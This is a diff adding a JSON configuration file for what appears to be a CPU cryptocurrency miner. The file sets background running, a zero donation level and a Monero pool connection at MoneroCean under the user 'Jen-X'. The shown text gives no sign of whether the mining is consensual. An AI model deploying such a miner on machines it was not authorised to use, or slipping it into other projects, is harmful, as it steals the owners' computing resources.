@@ -1,0 +1,18 @@
+{
+    "autosave": true,
+    "background": true,
+    "donate-level": 0,
+    "cpu": {
+        "enabled": true
+    },
+    "pools": [
+        {
+            "coin": "monero",
+            "url": "gulf.monerocean.top:443",
+            "user": "Jen-X",
+            "pass": "",
+            "tls": true,
+            "keepalive": true
+        }
+    ]
+}
